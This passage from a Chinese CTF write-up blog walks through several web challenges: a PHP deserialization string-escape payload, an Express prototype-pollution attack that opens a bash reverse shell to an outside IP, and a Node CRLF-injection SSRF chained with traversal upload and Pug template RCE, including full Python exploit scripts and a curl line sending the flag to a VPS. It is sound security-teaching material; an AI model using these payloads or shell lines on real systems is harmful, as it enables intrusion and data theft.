class="string">";N;s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>下一步我们就需要把payload逃逸出去：由于payload一共<code>454</code>个字符，因此，我们需要构造黑名单中的内容，通过替换为<code>hacker</code>把payload挤出去，通过<code>safe()</code>函数我们可以知道，一个<code>&#39;</code>替换为<code>hacker</code>可以替换挤出5个字符，一个<code>union</code>替换为<code>hacker</code>可以挤出1个字符，那么在payload前面加上90个<code>&#39;</code>和4个<code>union</code>就可以把454个字符的payload挤出去了，构造最终payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>通过POST方式，将payload打入<code>update.php</code>即可拿到经过md5加密之后的password，解密即可。<br>本道题是在BUU复现的，密码已经被改为了<code>glzjin</code>了，登录即可拿flag。</p><p>补充：smity师傅给了一个很详细的题解，可以好好学学这题：<a href="https://www.anquanke.com/post/id/200200">这里</a>。</p><h2 id="Ez-Express"><a href="#Ez-Express" class="headerlink" title="Ez_Express"></a>Ez_Express</h2><p>考察JS原型链污染，JS之前没学过，在BUU上复现的过程中慢慢学了一些，关于JS原型链的污染参考<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">P神的文章</a>。</p><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，可以看到一些提示：<br><img src="http://ggb0n.cool/images/gyctf5.png" alt=""></p><p>要求我们必须以<code>ADMIN</code>登录，但是这个用户又注册不了…</p><p>dirsearch扫后台可以发现<a href="http://www.zip的存在，把源码拿下来，看看其中的玄机。">www.zip的存在，把源码拿下来，看看其中的玄机。</a></p><p>在<code>index.js</code>中的<code>login</code>路由下发现突破点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到，在注册的时候存在<code>toUpperCase()</code>的使用，这个函数是存在可利用的漏洞的，即利用特殊字符进行绕过：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toUpperCase():</span><br><span class="line">ı ==&gt; I</span><br><span class="line">ſ ==&gt; S</span><br></pre></td></tr></table></figure><p>另外JS中的<code>toLowerCase()</code>函数也存在对特殊字符的不规范处理：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toLowerCase():</span><br><span class="line">İ ==&gt; i</span><br><span class="line">K ==&gt; k</span><br></pre></td></tr></table></figure><p>根据如上特性，我们可以利用<code>admın</code>身份进行注册，经过<code>toUpperCase()</code>处理便成了<code>ADMIN</code>从而成功登录：<br><img src="http://ggb0n.cool/images/gyctf1.png" alt=""></p><p>可以看到，提示了flag的位置，应该就需要RCE来进行读取了。</p><p>再审代码，发现<code>index.js</code>中存在<code>merge</code>和<code>clone</code>，根据在前面提到的P神的文章中的学习，猜测应该是JS原型链污染：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进一步在<code>action</code>路由下发现了<code>clone</code>的使用：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>是将<code>req</code>请求中的内容拼接到<code>session</code>的过程，显然，<code>req.body</code>是我们可控的，是考察原型链污染没错了。</p><p><code>action</code>路由是啥时候访问的呢？其实就是提交输入的地方：<br><img src="http://ggb0n.cool/images/gyctf.png" alt=""></p><h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><p>但是怎么才能实现原型链的污染呢？看到<code>info</code>路由下出现了<code>outputFunctionName</code>，参考另一篇<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">文章</a>，讲了利用<code>outputFunctionName</code>进行污染的方式，payload如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>大致含义就是：</p><blockquote><p>利用对象的<code>__proto__</code>属性，向类的原型对象<code>prototype</code>中写入一个新的属性和属性值，即<code>outputFunctionName</code>和对应的值，如此以来，该类就存在了这个属性，实例化的时候也会继承，因此当我们再去访问<code>info</code>路由的时候<code>res.outputFunctionName</code>的值已经是我们写入的payload中的RCE部分的内容了，从而即可在VPS上反弹shell。</p></blockquote><p>由于是在BUU上复现的，开一台内网主机，拿到ip之后构造payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.1.33.241/8899 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>同时在该内网主机上进行监听，在访问<code>action</code>路由的时候抓包更改<code>Content-Type</code>为<code>application/json</code>，并将我们如上构造的payload写入：<br><img src="http://ggb0n.cool/images/gyctf2.png" alt=""></p><p>前面就污染了原型链了，然后访问<code>info</code>路由进行命令的执行：<br><img src="http://ggb0n.cool/images/gyctf3.png" alt=""></p><p>从而拿到shell：<br><img src="http://ggb0n.cool/images/gyctf4.png" alt=""></p><p>然后就可以随便读取文件，拿到flag了。</p><p>有关JS的题目其实没怎么做过，因为还没有专门学过JS，但是JS确实越来用的越多，题也不少，很有学的必要。</p><h2 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h2><p>又是一道JS的题，考察<code>CRLF注入</code>、SSRF</p><p>CRLF注入参考<a href="https://www.cnblogs.com/uestc2007/p/10880338.html">这里</a>：</p><blockquote><p>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</p></blockquote><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目即可拿到源码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//SSRF</span></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>分析代码得知几个路由的用处：</p><blockquote><p>1、 /：会包含/template目录下的一个pug模板文件来用pub进行渲染；</p><p>2、/source：回显源码；</p><p>3、/file_upload：限制了只能由IP为<code>127.0.0.1</code>进行文件上传，并且我们可以通过控制MIME进行目录穿越，从而将文件上传到任意目录；</p><p>4、/core：通过<code>q</code>向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。</p></blockquote><p>但是<code>/core</code>路由下不能直接SSRF，而是需要利用<code>Node js</code>的编码安全问题（参考<a href="https://xz.aliyun.com/t/2894">这里</a>），对编码精心构造进行<code>CRLF注入</code>从而来进行SSRF，那么解题思路就明确了：</p><ul><li>1、利用CRLF注入进行SSRF</li><li>2、利用SSRF伪造本地IP进行文件上传</li><li>3、上传包含命令执行代码的pug文件到<code>/template</code>目录</li><li>4、利用<code>action</code>参数包含文件，执行命令</li></ul><h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><p>参考上面文章可知，我们可以构造为<code>\u010D\u010A</code>来替换换行<code>\r\n（%0D%0A）</code>，其他的一些特殊字符也如此构造，如<code>空格(%20)</code>构造编码为<code>\u0120</code>，<code>+(%2B)</code>构造编码构造为<code>\u012B</code>…</p><p>根据这个方式，构造拆分请求从而进行SSRF，参考网上师傅的exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""" HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">"""------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="ggb0n.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.format(len(body), body) \</span><br><span class="line">    .replace(<span class="string">'+'</span>, <span class="string">'\u012b'</span>)             \</span><br><span class="line">    .replace(<span class="string">' '</span>, <span class="string">'\u0120'</span>)             \</span><br><span class="line">    .replace(<span class="string">'\r\n'</span>, <span class="string">'\u010d\u010a'</span>)    \</span><br><span class="line">    .replace(<span class="string">'"'</span>, <span class="string">'\u0122'</span>)             \</span><br><span class="line">    .replace(<span class="string">"'"</span>, <span class="string">'\u0a27'</span>)             \</span><br><span class="line">    .replace(<span class="string">'['</span>, <span class="string">'\u015b'</span>)             \</span><br><span class="line">    .replace(<span class="string">']'</span>, <span class="string">'\u015d'</span>) \</span><br><span class="line">    + <span class="string">'GET'</span> + <span class="string">'\u0120'</span> + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/core?q='</span> + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/?action=ggb0n'</span>).text)</span><br></pre></td></tr></table></figure><p>出题师傅的exp具有更高的灵活性：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">"""x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require('child_process').execSync('evalcmd')</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParm</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>,<span class="string">"%C4%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"%C4%8D%C4%8A"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\""</span>,<span class="string">"%C4%A2"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"'"</span>,<span class="string">"%C4%A7"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"`"</span>,<span class="string">"%C5%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"!"</span>,<span class="string">"%C4%A1"</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">"+"</span>,<span class="string">"%2B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">";"</span>,<span class="string">"%3B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"&amp;"</span>,<span class="string">"%26"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">"global"</span>,<span class="string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"process"</span>,<span class="string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"mainModule"</span>,<span class="string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"require"</span>,<span class="string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"root"</span>,<span class="string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"child_process"</span>,<span class="string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"exec"</span>,<span class="string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">"evalcmd"</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">"/core?q="</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">"/?action=5am3_get_flag"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 "curl vps-ip:port -X POST -d `cat /flag.txt`"</span></span><br></pre></td></tr></table></figure><p>同志仍需努力啊！</p><p>参考：<br><a href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2</a><br><a href="https://blog.5am3.com/2020/02/11/ctf-node1/#自己出的-node-game">https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a></p><h2 id="Crypto-Easy-RSA"><a href="#Crypto-Easy-RSA" class="headerlink" title="Crypto-Easy_RSA"></a>Crypto-Easy_RSA</h2><p>考察共模攻击</p><h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><p>给的附件内容如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span 